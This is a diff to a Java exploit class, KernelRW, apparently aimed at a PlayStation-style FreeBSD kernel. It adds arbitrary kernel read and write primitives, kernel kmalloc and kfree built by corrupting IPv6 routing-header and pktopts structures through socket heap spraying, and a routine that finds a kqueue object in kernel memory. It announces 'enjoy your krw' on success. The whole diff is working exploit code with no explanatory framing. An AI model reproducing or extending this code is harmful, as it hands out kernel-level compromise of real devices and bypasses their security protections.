@@ -4,13 +4,15 @@ public class KernelRW extends Thread
 {
     private static long getpid = F(0x2001, "getpid");
     private static long socket = F(0x2001, "socket");
-    private static long kqueue = F(0x2001, "kqueue");
-    private static long kevent = F(0x2001, "kevent");
     private static long close = F(0x2001, "close");
     private static long getsockopt = F(0x2001, "getsockopt");
     private static long setsockopt = F(0x2001, "setsockopt");
     private static long usleep = F(0x2001, "usleep");
+    private static long kqueue = F(0x2001, "kqueue");
     private static long sceKernelSendNotificationRequest = F(0x2001, "sceKernelSendNotificationRequest");
+    public long pktoptsLeak;
+    public int kqueue_fd;
+    public long kqueue_addr;
 
     private static long F(int dll, String name)
     {
@@ -69,19 +71,16 @@ public class KernelRW extends Thread
     private static int TCLASS_SPRAY = 0x41;
     private static int TCLASS_TAINT = 0x42;
     private static int SPRAY_SIZE = 350;
-    private static int KQ_SIZE = 1;
-    private static int SPRAY2_SIZE = 32;
+    private static int SPRAY2_SIZE = 64;
     private static int SPRAY3_SIZE = 128;
     private static int SMALL_SPRAY = 64;
 
     private KernelRW master;
 
-    private int kevent_sock;
     private int master_sock;
     private int overlap_sock;
     private int victim_sock;
     private int[] spray_sock;
-    private int[] kq;
     private String log;
     private boolean triggered;
     private boolean done1;
@@ -218,7 +217,7 @@ public class KernelRW extends Thread
         return NativeUtils.getLong(mem2048+112);
     }
 
-    private String notify(String s) throws Exception
+    public String notify(String s) throws Exception
     {
         long q = calloc(0xc30);
         NativeUtils.putInt(q+0x10, -1);
@@ -237,20 +236,32 @@ public class KernelRW extends Thread
 
     public long kread8(long addr) throws Exception
     {
+        long offset = 0;
+        if((addr & 4095) >= 4076)
+        {
+            offset = (addr & 4095) - 4076;
+            if(offset >= 12)
+                offset = 12;
+            addr -= offset;
+        }
         NativeUtils.putLong(mem24, addr);
         NativeUtils.putLong(mem24+8, 0);
         NativeUtils.putInt(mem24+16, 0);
         if(C(setsockopt, master_sock, 41, 46, mem24, 20) != 0)
             die();
         NativeUtils.putLong(mem24, 0xdeaddeaddeadl);
+        NativeUtils.putLong(mem24+8, 0xdeaddeaddeadl);
+        NativeUtils.putInt(mem24+16, 0xdead);
         NativeUtils.putInt(mem24+20, 20);
         if(C(getsockopt, victim_sock, 41, 46, mem24, mem24+20) != 0)
             die();
-        return NativeUtils.getLong(mem24);
+        return NativeUtils.getLong(mem24+offset);
     }
 
     public boolean kwrite20(long addr, long a, long b, int c) throws Exception
     {
+        if(a == 0 && b == 0 && c == 0)
+            return false;
         NativeUtils.putLong(mem24, addr);
         NativeUtils.putLong(mem24+8, 0);
         NativeUtils.putInt(mem24+16, 0);
@@ -262,6 +273,82 @@ public class KernelRW extends Thread
         return C(setsockopt, victim_sock, 41, 46, mem24, 20) == 0;
     }
 
+    public long kmalloc(int size) throws Exception
+    {
+        if(size > 2048)
+            throw new Exception("too big");
+        if(size < 32)
+            size = 32;
+        kwrite20(pktoptsLeak+112, 0, 1, 0);
+        kwrite20(pktoptsLeak+120, 0, 1, 0);
+        int sz = fake_rthdr(size, 0, 0);
+        set_rthdr(victim_sock, sz);
+        long addr = kread8(pktoptsLeak+112);
+        kwrite20(pktoptsLeak+112, 0, 1, 0);
+        kwrite20(pktoptsLeak+120, 0, 1, 0);
+        return addr;
+    }
+
+    public void kfree(long ptr) throws Exception
+    {
+        kwrite20(pktoptsLeak+112, ptr, 0, 0);
+        set_rthdr(victim_sock, 0);
+    }
+
+    private void leak_kqueue() throws Exception
+    {
+        java.util.ArrayList fds = new java.util.ArrayList();
+        java.util.ArrayList allmems = new java.util.ArrayList();
+        java.util.HashSet mems_set = new java.util.HashSet();
+        long ans = 0;
+        int count = 0;
+        for(;;)
+        {
+            ans = 0;
+            count = 0;
+            mems_set.clear();
+            int fd = -1;
+            for(int i = 0; i < 10000; i++)
+            {
+                if(i == 5000)
+                    fd = (int)C(kqueue);
+                long addr = kmalloc(0x200);
+                allmems.add(new Long(addr));
+                mems_set.add(new Long(addr));
+            }
+            java.util.Iterator it = mems_set.iterator();
+            while(it.hasNext())
+            {
+                long a1 = ((Long)it.next()).longValue();
+                long a2 = a1 ^ 0x200;
+                if(mems_set.contains(new Long(a2)))
+                    continue;
+                long q = kread8(a2);
+                if(!(q >= -0x1000000000000l && q < -1 && (q & 0xfff) == 0xad3))
+                    continue;
+                if((kread8(q) & 0xffffffffffffffl) == 0x65756575716bl) // "kqueue\x00"
+                {
+                    ans = a2;
+                    count++;
+                }
+            }
+            notify("fd = "+fd+", ans = "+ans+", count = "+count);
+            if(count == 1)
+            {
+                kqueue_addr = ans;
+                kqueue_fd = fd;
+                break;
+            }
+            fds.add(new Integer(fd));
+        }
+        java.util.Iterator it = fds.iterator();
+        while(it.hasNext())
+            C(close, ((Integer)it.next()).intValue());
+        it = allmems.iterator();
+        while(it.hasNext())
+            kfree(((Long)it.next()).longValue());
+    }
+
     public String main() throws Exception
     {
         notify("starting exploit");
@@ -269,16 +356,11 @@ public class KernelRW extends Thread
         mem2048 = calloc(2048);
         for(int i = 64; i < 10000; i++)
             C(close, i);
-        kevent_sock = new_socket();
         master_sock = new_socket();
         spray_sock = new int[SPRAY_SIZE];
-        kq = new int[KQ_SIZE];
         log += "sockets =";
         for(int i = 0; i < SPRAY_SIZE; i++)
             log += " " + (spray_sock[i] = new_socket());
-        log += "\nkqueues =";
-        for(int i = 0; i < KQ_SIZE; i++)
-            log += " " + (kq[i] = (int)C(kqueue));
         log += "\n";
         mem24 = calloc(24);
         for(int i = 1; i <= 3*SMALL_SPRAY; i++)
@@ -316,10 +398,8 @@ public class KernelRW extends Thread
         overlap_idx = tcl & 65535;
         overlap_sock = spray_sock[overlap_idx];
         log += "overlap_idx = " + overlap_idx + "\n";
-        long leak = leak_kmalloc(0x100);
-        log += "leak = " + leak + "\n";
-        /*for(int i = 0; i < SPRAY3_SIZE; i++)
-            set_rthdr(spray_sock[i], 0);*/
+        long leak = pktoptsLeak = leak_kmalloc(0x100);
+        log += "pktoptsLeak = " + leak + "\n";
         setStage("rthdr spray 2");
         set_rthdr(master_sock, 0);
         for(int i = 2*SMALL_SPRAY+1; i <= 3*SMALL_SPRAY; i++)
@@ -329,9 +409,6 @@ public class KernelRW extends Thread
         set_rthdr(spray_sock[overlap_idx], 0);
         for(int i = 1; i <= SMALL_SPRAY; i++)
             free_pktopts(spray_sock[SPRAY_SIZE-i]);
-        /*for(int i = 0; i < SPRAY3_SIZE; i++)
-            if(i != overlap_idx)
-                set_rthdr(spray_sock[i], 0);*/
         sz = fake_rthdr(256, leak+16, TCLASS_MASTER_2);
         for(int i = SPRAY3_SIZE; i < SPRAY_SIZE; i++)
         {
@@ -386,6 +463,12 @@ public class KernelRW extends Thread
             return log;
         }
         victim_sock = spray_sock[victim_idx];
+        /*setStage("closing sockets");
+        spray_sock[victim_idx] = new_socket();
+        for(int i = SPRAY2_SIZE; i < SPRAY_SIZE; i++)
+            C(close, spray_sock[i]);*/
+        setStage("leaking kqueue");
+        leak_kqueue();
         notify("enjoy your krw");
         ok = true;
         return log;
